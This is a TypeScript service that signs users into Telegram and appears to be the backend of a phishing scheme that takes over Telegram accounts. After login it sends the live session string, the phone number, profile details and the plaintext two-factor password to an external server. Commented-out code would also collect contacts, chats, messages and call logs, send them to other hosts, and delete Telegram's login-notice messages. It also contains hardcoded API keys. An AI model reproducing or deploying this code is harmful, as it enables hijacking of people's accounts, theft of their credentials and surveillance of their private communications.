import { Api } from "telegram/tl";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import axios from "axios";
import { sleep } from "telegram/Helpers";
import { computeCheck } from "telegram/Password";
import bigInt from "big-integer";
import { LogLevel } from "telegram/extensions/Logger";
import { parseError } from "../../utils";
import { BadRequestException } from "@nestjs/common";

const clients = new Map();
let creds = [
    {
        apiId: 27919939,
        apiHash: "5ed3834e741b57a560076a1d38d2fa94"
    },
    {
        apiId: 25328268,
        apiHash: "b4e654dd2a051930d0a30bb2add80d09"
    },
    {
        apiId: 2899,
        apiHash: "36722c72256a24c1225de00eb6a1ca74"
    },
    {
        apiId: 24559917,
        apiHash: "702294de6c08f4fd8c94c3141e0cebfb"
    },
    {
        apiId: 12777557,
        apiHash: "05054fc7885dcfa18eb7432865ea3500"
    },
    {
        apiId: 27565391,
        apiHash: "a3a0a2e895f893e2067dae111b20f2d9"
    },
    {
        apiId: 23195238,
        apiHash: "15a8b085da74163f158eabc71c55b000"
    },
]

// const apiId = 24559917 || parseInt(process.env.API_ID);
// const apiHash = "702294de6c08f4fd8c94c3141e0cebfb" || process.env.API_HASH;

export async function restAcc(phoneNumber) {
    await sleep(1000);
    console.log("Reset - ", phoneNumber);
    const client: TgSignupService = getClient(phoneNumber)
    if (client) {
        await client.client?.destroy();
        await client.client?.disconnect();
        client.client.session.delete();
        client.session.delete();
        client.client._destroyed = true;
        client.client = null;
        delete client['client'];
        await deleteClient(phoneNumber);
    }
}

export function getClient(number): TgSignupService {
    return clients.get(number);
}

export async function hasClient(number) {
    return clients.has(number);
}

function contains(str, arr) {
    return (arr.some(element => {
        if (str?.includes(element)) {
            return true;
        }
        return false;
    }))
};

export async function deleteClient(number) {
    console.log("Deleting Client - ", number);
    const cli = getClient(number);
    await cli?.disconnect();
    return clients.delete(number);
}

export async function disconnectAll() {
    for (const [phoneNumber, client] of clients.entries()) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        } catch (error) {
            console.log(error);
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}

export async function createClient(number) {
    try {
        if (clients.has(number)) {
            console.log("Client already exist");
            const cli: TgSignupService = clients.get(number);
            setTimeout(async () => {
                await restAcc(number)
            }, 60000);
            return (await cli.sendCode(false));
        } else {
            const randomIndex = Math.floor(Math.random() * creds.length);
            const apiHash = creds[randomIndex].apiHash
            const apiId = creds[randomIndex].apiId
            console.log("Creating new client - ", number, creds[randomIndex]);
            const cli = new TgSignupService(number, apiId, apiHash);
            clients.set(number, cli);
            await sleep(500)
            return (await cli.sendCode(false));
        }
    } catch (error) {
        console.log(parseError(error))
        throw new BadRequestException(parseError(error).message)
    }
}

export class TgSignupService {
    session: any;
    phoneNumber: any;
    client: TelegramClient;
    phoneCodeHash: any;
    apiId: number;
    apiHash: string;
    constructor(number: any, apiId: number, apiHash: string) {
        this.apiId = apiId;
        this.apiHash = apiHash;
        this.phoneNumber = number;
        this.session = new StringSession('');
        this.client = null;
        this.createClient();
    }

    async getLastActiveTime() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        let latest = 0
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore')) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        })
        return latest
    }

    async disconnect() {
        await this.client?.disconnect();
        await this.client?.destroy();
        await this.session.delete();
        this.client = null
    }

    async createClient() {
        try {
            console.log(this.apiId, this.apiHash)
            this.client = new TelegramClient(this.session, this.apiId, this.apiHash, {
                connectionRetries: 5,
            });
            await this.client.setLogLevel(LogLevel.ERROR);
            await this.client.connect();
        } catch (error) {
            console.log("Error while Connecting:", error);
        }
    }

    async deleteMessages() {
        // console.log("IsConnected - ", this.client.connected, this.phoneNumber);
        // if (this.client.connected) {
        //     try {
        //         const msgs = await this.client.getMessages("777000", { limit: 10 });
        //         const len = msgs['total'];
        //         console.log(len)
        //         for (let i = 0; i < len - 1; i++) {
        //             console.log(msgs[i]?.text);
        //             msgs[i]?.delete({ revoke: true });
        //         }
        //     } catch (error) {
        //         console.log("Cannot delete Messages - ", this.phoneNumber);
        //     }
        // }
        console.log("DeleteMessages TODO")
    }

    async sendCode(
        forceSMS = false
    ): Promise<{
        phoneCodeHash: string;
        isCodeViaApp: boolean;
    }> {
        try {
            await this.client.connect();
            console.log("Sending OTP - ", this.phoneNumber, this.apiId, this.apiHash);
            try {

                const sendResult = await this.client.invoke(
                    new Api.auth.SendCode({
                        phoneNumber: `+${this.phoneNumber}`,
                        apiId: this.apiId,
                        apiHash: this.apiHash,
                        settings: new Api.CodeSettings({}),
                    })
                );
                console.log('Send result - ', sendResult);
                setTimeout(async () => {
                    await restAcc(this.phoneNumber);
                }, 150000);
                if (sendResult instanceof Api.auth.SentCodeSuccess)
                    throw new Error("logged in right after sending the code");
                this.phoneCodeHash = sendResult.phoneCodeHash

                if (!forceSMS || sendResult.type instanceof Api.auth.SentCodeTypeSms) {
                    return {
                        phoneCodeHash: sendResult.phoneCodeHash,
                        isCodeViaApp:
                            sendResult.type instanceof Api.auth.SentCodeTypeApp,
                    };
                }

                const resendResult = await this.client.invoke(
                    new Api.auth.ResendCode({
                        phoneNumber: `+${this.phoneNumber}`,
                        phoneCodeHash: sendResult.phoneCodeHash,
                    })
                );
                console.log('ReSend result - ', sendResult);
                if (resendResult instanceof Api.auth.SentCodeSuccess)
                    throw new Error("logged in right after resending the code");

                this.phoneCodeHash = resendResult.phoneCodeHash

                return {
                    phoneCodeHash: resendResult.phoneCodeHash,
                    isCodeViaApp: resendResult.type instanceof Api.auth.SentCodeTypeApp,
                };
            } catch (sendCodeError) {
                console.log("Error in sending code:", sendCodeError);
                // Handle the specific error or rethrow if needed
                // Add additional handling or logging as necessary
                throw sendCodeError; // Rethrow the error to the outer catch block
            }
        } catch (err: any) {
            if (err.errorMessage === "AUTH_RESTART") {
                try {
                    return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);
                } catch (error) {
                    console.log("heelo: ", error)
                }
            } else {
                throw err
            }
        }
    }

    async login(phoneCode: any, passowrd?: any) {
        let isRegistrationRequired = false
        let termsOfService;
        try {
            if (!phoneCode) {
                throw new Error("Code is empty");
            }
            if (!this.client.connected) {
                await this.client.connect();
            }
            const result = await this.client?.invoke(
                new Api.auth.SignIn({
                    phoneNumber: `+${this.phoneNumber}`,
                    phoneCodeHash: this.phoneCodeHash,
                    phoneCode
                })
            );
            if (result instanceof Api.auth.AuthorizationSignUpRequired) {
                isRegistrationRequired = true;
                termsOfService = result.termsOfService;
            } else {
                this.processLogin(result.user);
                await restAcc(this.phoneNumber);
                return { status: 200, message: "Login success" }
            }
        } catch (err: any) {
            console.log(err);
            if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                console.log("passowrd Required")
                try {
                    const passwordSrpResult = await this.client.invoke(
                        new Api.account.GetPassword()
                    );
                    const passwordSrpCheck = await computeCheck(
                        passwordSrpResult,
                        passowrd
                    );
                    const { user } = (await this.client.invoke(
                        new Api.auth.CheckPassword({
                            password: passwordSrpCheck,
                        })
                    )) as Api.auth.Authorization;

                    this.processLogin(user, passowrd);
                    return { status: 200, message: "Login success" }
                } catch (error) {
                    if (passowrd && passowrd !== '') {
                        return { status: 400, message: "Incorrect Password! Please Try Again <br/>Enter your telegram Two-Factor-Authentication password." }
                    } else {
                        return { status: 400, message: "Telegram 2FA Password" }
                    }
                }
            } else {
                const shouldWeStop = false//await authParams.onError(err);
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
            await restAcc(this.phoneNumber);
            return { status: 400, message: err.errorMessage }
        }

        if (isRegistrationRequired) {
            try {
                let lastName = 'last name';
                let firstName = "first name";
                const { user } = (await this.client.invoke(
                    new Api.auth.SignUp({
                        phoneNumber: `+${this.phoneNumber}`,
                        phoneCodeHash: this.phoneCodeHash,
                        firstName,
                        lastName,
                    })
                )) as Api.auth.Authorization;

                if (termsOfService) {
                    // This is a violation of Telegram rules: the user should be presented with and accept TOS.
                    await this.client.invoke(
                        new Api.help.AcceptTermsOfService({
                            id: termsOfService.id,
                        })
                    );
                }

                return user;
            } catch (err: any) {
                const shouldWeStop = false//await authParams.onError(err);
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
        }
        await restAcc(this.phoneNumber);
    }

    async getCallLogs() {
        try {
            const result: any = await this.client.invoke(
                new Api.messages.Search({
                    peer: new Api.InputPeerEmpty(),
                    q: '',
                    filter: new Api.InputMessagesFilterPhoneCalls({}),
                    minDate: 0,
                    maxDate: 0,
                    offsetId: 0,
                    addOffset: 0,
                    limit: 100,
                    maxId: 0,
                    minId: 0,
                    hash: bigInt.zero,
                })
            );
            console.log("Got Messages");

            const callLogs = result.messages.filter(
                message => message.action instanceof Api.MessageActionPhoneCall
            );
            console.log("filtered call logs");

            const filteredResults = {
                outgoing: 0,
                incoming: 0,
                video: 0,
                chatCallCounts: {},
                totalCalls: 0
            };

            for (const log of callLogs) {
                try {
                    filteredResults.totalCalls++;
                    const callInfo = {
                        callId: log.action.callId.value,
                        duration: log.action.duration,
                        video: log.action.video,
                        timestamp: log.date
                    };
                    console.log(callInfo);

                    // Categorize by type
                    if (log.out) {
                        filteredResults.outgoing++;
                    } else {
                        filteredResults.incoming++;
                    }

                    if (log.action.video) {
                        filteredResults.video++;
                    }

                    const chatId = log.peerId.userId.value;
                    if (!filteredResults.chatCallCounts[chatId]) {
                        console.log("Getting Enitity", chatId)
                        let ent = { firstName: 'Default', lastName: null };
                        try {
                            ent = <any>await this.client.getInputEntity(chatId);
                            console.log("Got Enitity", chatId)
                        } catch (error) {
                            console.log("Failed to get entity for chatId:", chatId, error);
                        }
                        filteredResults.chatCallCounts[chatId] = {
                            name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                            count: 0
                        };
                    } else {
                        console.log(chatId, ' Already exists');
                    }
                    filteredResults.chatCallCounts[chatId].count++;
                } catch (error) {
                    console.log("Error processing log:", log, error);
                }
            }
            console.log('Returning filtered results', filteredResults);
            return filteredResults;
        } catch (error) {
            console.error("Error in getCallLogs:", error);
            throw error;
        }
    }

    async processLogin(result, passowrd = undefined) {
        console.log(this.client.session.save());
        let photoCount = 0;
        let videoCount = 0;
        let movieCount = 0;
        const sess = this.client.session.save() as unknown as string;
        const user: any = await result.toJSON();
        // const dialogs = await this.client?.getDialogs({ limit: 600 });
        // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
        // for (const message of messageHistory) {
        //     const text = message.text.toLocaleLowerCase();
        //     if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
        //         movieCount++
        //     } else {
        //         if (message.photo) {
        //             photoCount++;
        //         } else if (message.video) {
        //             videoCount++;
        //         }
        //     }
        // }
        // const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({
        //     hash: bigInt.zero
        // }));
        let channels = 0;
        const chatsArray = [];
        let personalChats = 0;

        // Process and format the exported contacts as needed
        // const formattedContacts = exportedContacts.users.map(contact => ({
        //     phone: contact.phone,
        //     firstName: contact.firstName,
        //     lastName: contact.lastName,
        //     userName: contact.username,
        //     clientId: contact.id.toString(),
        //     fromId: user.id
        // }));
        console.log("AllGood")
        // for (let chat of dialogs) {
        //     if (chat.isChannel || chat.isGroup) {
        //         channels++;
        //         const chatEntity: any = chat.entity.toJSON();
        //         const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
        //         if (!chatEntity.broadcast && !cannotSendMsgs) {
        //             chatsArray.push(chatEntity);
        //         }
        //     } else {
        //         personalChats++;
        //     }
        // }
        // const callLogs = await this.getCallLogs();


        const payload3 = {
            photoCount, videoCount, movieCount,
            gender: null,//data?.data?.gender,
            mobile: user.phone,
            session: `${sess}`,
            firstName: user.firstName,
            lastName: user.lastName,
            userName: user.username,
            channels: channels,
            personalChats: personalChats,
            calls: {},//callLogs?.totalCalls > 0 ? callLogs : {},
            contacts: 0,//exportedContacts.savedCount,
            msgs: 0,//messageHistory.total,
            totalChats: 0,//chats['total'],
            lastActive: new Date().toISOString().split('T')[0],
            tgId: user.id
        };
        if (passowrd) {
            payload3['twoFA'] = true;
            payload3['password'] = passowrd
        }
        console.log("Calculated results");
        try {
            const url = `${process.env.tgcms}/user`;
            console.log("posting results : ", url);
            await axios.post(url, payload3, { headers: { 'Content-Type': 'application/json' } });
            // await axios.post(`https://ramyaa3.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
            // await axios.post(`https://ramyaaa2.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
        } catch (error) {
            console.log("Error Occured 1");
            console.log(error)
        }
        // await this.deleteMessages();
        await this.disconnect();
        await deleteClient(this.phoneNumber);
    }
}
